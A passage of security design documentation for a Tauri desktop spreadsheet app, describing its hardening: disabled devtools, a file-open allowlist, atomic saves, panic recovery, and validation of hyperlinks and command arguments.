| Devtools: the `devtools` cargo feature is not enabled and no window sets `devtools: true`, so devtools exist only in debug builds. | `Cargo.toml`, `tauri.conf.json` |
| `withGlobalTauri: false`: `window.__TAURI__` is not injected; the UI imports `@tauri-apps/api` explicitly. | `tauri.conf.json` |
| No network access from the app: the frontend makes no `fetch`; fonts are bundled (`@fontsource-variable/inter`); CSP `connect-src` allows IPC only. | `packages/app`, `packages/tokens` |
| The webview never receives raw file bytes; files are parsed in Rust (`DocumentService::open`) and only DTOs cross IPC. | `src/commands.rs` |
| Command code has no `unsafe` (`#![forbid(unsafe_code)]`) and no `unwrap()`. Every engine call runs under `catch_unwind`: a panic becomes `ApiError { code: "internal" }` for that call, before the service guard is dropped, so the mutex is not poisoned and the other documents stay usable. Poisoned locks are recovered (`PoisonError::into_inner`) as a second line of defence. Tests: `tally-desktop::tests::engine_panic_leaves_later_commands_working`, `tally-desktop::tests::poisoned_service_lock_is_recovered`. | `src/commands.rs`, `src/state.rs` |
| Engine calls run on `tauri::async_runtime::spawn_blocking` workers, so a long open or recalc never parks the async runtime's workers (which the dialog commands also need). | `src/commands.rs` (`blocking`) |
| Saving is atomic: the file is written to a temporary file in the same directory, `fsync`ed, then renamed over the target (keeping its permissions). A crash or full disk leaves the original intact, and a symlink at the target is replaced, not written through. Test: `tally-engine::security::files::save_is_atomic_and_does_not_follow_symlinks`. | `tally-engine` `service::write_atomically` |

### `wb_open(path)` allowlist

JS cannot make the shell read an arbitrary path. `wb_open` accepts a path only if it is:

1. a path the user picked in a native Open or Save dialog during this session (`AppState.allowed`, which holds both the path as returned and its canonical form), or
2. in the persisted recent-files list (`<app_config_dir>/recent.json`, ≤ 10 entries, written only by the shell after a successful dialog open or save).

The check compares the path *as given* before touching the file system, so
every rejected path gets the same `invalid_argument` error whether or not it
exists (no existence oracle; test
`tally-desktop::tests::open_allowlist_is_not_an_existence_oracle`). Only an
allowed path is then canonicalized (`std::fs::canonicalize`), and the
canonical form must be allowed too, so a symlink swapped in later cannot
redirect it. Save paths always come
from the Save dialog (`TauriClient.save(doc, path, …)` ignores the JS path
and shows the dialog when `path !== null`). `wb_new(template)` takes a
template **id** that the engine builds in code (`invoices`, `budget`, `stock`);
no file is read and unknown ids are `not_found`.

Residual risk: `recent.json` lives in the user's config directory, so
anything that can write there can add entries; that attacker already has
the user's file access.

### Tests

- `cargo test -p tally-desktop`: menu ids; command-layer end-to-end over the real engine (templates, assist, ODS/CSV round trip, allowlist rejection, panic and poison recovery).
- Manual: docs/qa/phase-a-manual.md §7.

### Hyperlinks

Cells can carry links (`Op::SetLink`, `HYPERLINK()`); the engine refuses
`javascript:`, `data:` and `vbscript:` targets when they are set. Opening a
link is a separate shell command, `open_url(url)` (`src/links.rs`), which
accepts only `http://host…`, `https://host…` and `mailto:address`, at most
2048 bytes, with no whitespace, control characters, quotes, `\`, `<`, `>`
or backticks; `file:` and every other scheme (including anything read from
a file) is `invalid_argument`. The URL goes to the OS handler as a single
argument: `open` on macOS and `xdg-open` on Linux (no shell parses it), and
`cmd /C start "" <url>` on Windows with `^ & | < > % ( ) !` escaped. No
opener plugin and no JS permission is involved. The UI opens a link only on
⌘-click or a click on the active cell's ↗ (a plain click selects), and
handles `#Sheet.A1` links itself by going to the cell. `user_name` returns
the OS account name for new note authors (no other data). With v0.3 the
shell registers 39 commands (docs/api.md); every command validates its
arguments before the engine sees them (`src/limits.rs`: find/replace text
and regular expressions, cell input and formulas ≤ 64 KiB, names ≤ 256
characters, a TSV paste ≤ 64 MiB, ranges inside the sheet) and rejects
violations with `invalid_argument`. Tests:
`tally-desktop::links::tests`, `tally-desktop::limits::tests`,
`tally-desktop::tests::open_url_rejects_script_and_file_links`,
`tally-desktop::tests::oversized_arguments_are_rejected_before_the_engine`.
